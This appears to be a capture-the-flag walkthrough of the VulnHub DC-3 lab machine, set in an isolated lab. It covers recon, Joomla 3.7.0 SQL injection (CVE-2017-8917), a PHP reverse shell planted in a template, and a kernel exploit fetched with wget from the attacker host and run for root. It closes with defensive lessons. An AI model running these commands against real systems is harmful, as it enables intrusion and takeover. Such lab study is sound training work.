# DC-3 — VulnHub Walkthrough

A clear, step-by-step penetration testing writeup of the DC-3 Capture The Flag (CTF) machine.

## About this machine

| | |
|---|---|
| Name | DC-3 |
| Author | DCAU7 |
| Source | [VulnHub — DC-3](https://www.vulnhub.com/entry/dc-3,312/) |
| Target OS | Ubuntu Linux (Joomla 3.7.0 CMS) |
| Goal | Get a shell, escalate to `root`, and read the flag |

DC-3 is a deliberately vulnerable virtual machine made for learning. The whole lab runs in a private, isolated network. Everything below was done on my own lab; never use these techniques against a system you do not own or do not have written permission to test.

The attacker machine is Kali Linux (`192.168.56.108`); the target is DC-3 (`192.168.56.110`).

---

## Step 1 — Reconnaissance

First I need to know which doors are open, then what is behind the website. Good recon points straight to the weak spot.

```bash
nmap -v -A -p1-65535 192.168.56.110
```

![Nmap Scan](https://github.com/user-attachments/assets/b0cbdecd-87fe-4edc-a94b-347e1dab24e3)

Only port 80 was open (Apache on Ubuntu), hosting a Joomla website. I then looked for hidden folders with Gobuster:

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://192.168.56.110
```

![Gobuster Results](https://github.com/user-attachments/assets/0d1bce27-5610-43de-a30a-a2be42d2f3d5)

And I confirmed the exact version with JoomScan:

```bash
joomscan --url http://192.168.56.110
```

![JoomScan Output](https://github.com/user-attachments/assets/acc4cd0d-f200-4aa7-832a-c3d8ac397be3)

The result was Joomla 3.7.0 with no firewall — a version that has a famous flaw.

---

## Step 2 — SQL injection (CVE-2017-8917)

Joomla 3.7.0 has a well-known SQL injection in the `com_fields` component (CVE-2017-8917). SQL injection lets me ask the database questions it should never answer, such as the admin username and password hash.

I searched for a ready exploit:

```bash
searchsploit "Joomla 3.7.0 com_fields SQL Injection"
```

![Searchsploit Results](https://github.com/user-attachments/assets/9ff8979e-8cf3-4c4f-93f0-54858fb476a1)

Running the public exploit pulled the admin username and the password hash out of the database:

![SQL Injection Exploit Output](https://github.com/user-attachments/assets/56bc4603-c551-4b4f-9b67-fb123af8d886)

A hash is not the real password, so I cracked it with John the Ripper to get the clear password:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Step 3 — Admin access and remote code execution

With the admin password, I can log into the Joomla back-office. A Joomla admin can edit template files, and template files are PHP code that runs on the server, so I can place my own PHP (a reverse shell) inside a template and make the server run it.

I logged in at `/administrator/`:

![Joomla Admin Login](https://github.com/user-attachments/assets/cedb5b97-1694-4fc0-9b21-b96d6866ae69)

Then I edited the `error.php` file of the Beez3 template and added a PHP reverse shell:

![Template Editing](https://github.com/user-attachments/assets/66f979dc-3986-44be-9447-f04f4bb5a55e)
![error.php Editor](https://github.com/user-attachments/assets/66cee97e-e90e-40af-9dd6-d66bf78d7cd5)
![Reverse Shell Configuration](https://github.com/user-attachments/assets/0e0c67c7-c72e-4d12-bc35-7a4b4fe9173b)

I started a Netcat listener on Kali, then triggered the payload by opening the template file in the browser:

```bash
curl http://192.168.56.110/templates/beez3/error.php
```

![RCE Trigger](https://github.com/user-attachments/assets/72dd604a-3c1b-4b28-9029-d691805235f6)

This gave me a reverse shell as the web user `www-data`.

---

## Step 4 — Privilege escalation (kernel exploit)

`www-data` is a low-power user. After checking the system I found the Linux kernel was old and vulnerable to a known bug (the eBPF `doubleput` exploit, 39772). A kernel exploit runs with the full power of the system, so a working one gives root.

On Kali, I started a small web server to share the exploit file:

```bash
sudo python3 -m http.server 39772
```

![Attacker HTTP Server](https://github.com/user-attachments/assets/207dd6e6-f0b7-439a-8481-24cb14730b66)

On the target, I downloaded, unpacked, compiled and ran the exploit:

```bash
wget http://192.168.56.108:39772/39772.zip
unzip 39772.zip
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

![Exploit Download & Compilation](https://github.com/user-attachments/assets/93bc01c6-f563-4011-a9d5-034c7f8135fc)
![Exploit Execution](https://github.com/user-attachments/assets/881b696b-2854-4c9c-9dd4-8afa0bce9575)

The exploit succeeded and gave me a root shell, so I read the flag:

```bash
cat /root/the-flag.txt
```

![Final Flag](https://github.com/user-attachments/assets/2b218d1d-c7d4-4458-887c-b154a9b6103d)

The machine was fully owned.

---

## Summary

| # | Step | Technique | Result |
|---|------|-----------|--------|
| 1 | Recon | Nmap + Gobuster + JoomScan | Found Joomla 3.7.0 |
| 2 | Initial access | SQL injection (CVE-2017-8917) + hash crack | Admin password |
| 3 | RCE | Edit Beez3 template, PHP reverse shell | Shell as `www-data` |
| 4 | Privilege escalation | eBPF kernel exploit (39772) | root + flag |

---

## What I learned (defender's view)

- Keep Joomla updated. Version 3.7.0 has the public CVE-2017-8917 flaw.
- Patch the kernel. An old, unpatched kernel turns a small web foothold into full root.
- Use a Web Application Firewall to block common SQL injection attacks.
- Protect `/administrator/` with an extra layer, such as an IP allow-list.
- Run the web server with least privilege so a web flaw does not reach the whole system.
- Watch critical files, such as template files, for unexpected changes.
